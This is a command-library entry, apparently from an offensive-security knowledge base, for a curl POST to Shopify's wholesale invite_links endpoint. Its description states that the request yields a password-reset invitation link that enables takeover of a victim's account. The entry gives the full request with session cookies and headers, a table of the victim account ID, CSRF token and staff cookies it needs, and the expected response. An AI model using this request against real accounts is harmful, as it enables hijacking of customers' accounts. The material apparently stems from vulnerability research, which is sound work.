---
data: >-
  curl -X POST
  'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/{ID_ACCOUNT}/invite_links'
  -H 'X-Csrf-Token: {CSRF_TOKEN}' -H 'X-Requested-With: XMLHttpRequest' -H
  'Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; ...'
tags:
  - shopify
  - api
  - takeover
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.640Z'
id: 8ed947b7-30d0-42b1-a51f-afc41fabb3a1
verified: false
validated: true
submitted: true
---
# shopify-invite-links-post

## Command

```bash
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/{ID_ACCOUNT}/invite_links' \
  -H 'Host: wholesale.shopifyapps.com' \
  -H 'Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _ga=GA1.2.tHExgAAT11NXuhaT9YUE8g%253D%253D; _session_id=fc5f618342a1e6b09a1b0dd8f663c815; shopify_domain=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkluTmpjbWx3ZEMxemNtTXRhSFIwY0hNdGFIbGtjbUY0WVc1dmJpMTRjM010YUhRdGMyTnlhWEIwTG0xNWMyaHZjR2xtZVM1amIyMGkiLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5zaG9waWZ5X2RvbWFpbiJ9fQ%3D%3D--0638dd0f382c4106ac4bc036aef29aff573e7e4f; _gid=GA1.2.1173666896.1626524371; _s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _shopify_s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _gat=1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182510?hmac=a916ff51bbbb7f51d6ac927131c0b28b08f54458a1062284fdbabd823d43c2f1&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529537' \
  -H 'X-Csrf-Token: {CSRF_TOKEN}' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: https://wholesale.shopifyapps.com' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Content-Length: 0' \
  -H 'Te: trailers' \
  -H 'Connection: close'
```

## Description

Sends a POST request to the Shopify wholesale invite_links endpoint to retrieve an invitation link for an active customer account after send_invite. This generates a token-based URL for password reset, enabling takeover. Empty body; relies on AJAX headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{ID_ACCOUNT}` | Victim's wholesale account ID (e.g., 5182518) | Yes |
| `{CSRF_TOKEN}` | X-Csrf-Token from session (e.g., 8TESa0/8klTiTrM0zMpVyEmoGvady47gKvvExY9jFYuH3PoV0xQEwTuAeN8WHkq2Vb+DAhtaZ4YkTKKh5f5NXg==) | Yes |
| Cookies | Full staff session cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518/invite_links' -H 'X-Csrf-Token: [token]' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: [cookies]'
```

### Advanced Usage

Match referer and full headers to session for authenticity.

## Expected Output

HTTP/2 201 Created with JSON body: {"invite_link":"https://script-src-https-hydraxanon-xss-ht-script.wholesale.shopifyapps.com/accounts/invitation/accept?invitation_token=█████"}

## Related

- [[commands/shopify-send-invite-post]]
- [[procedures/Generate-Invitation-Link-via-API]]
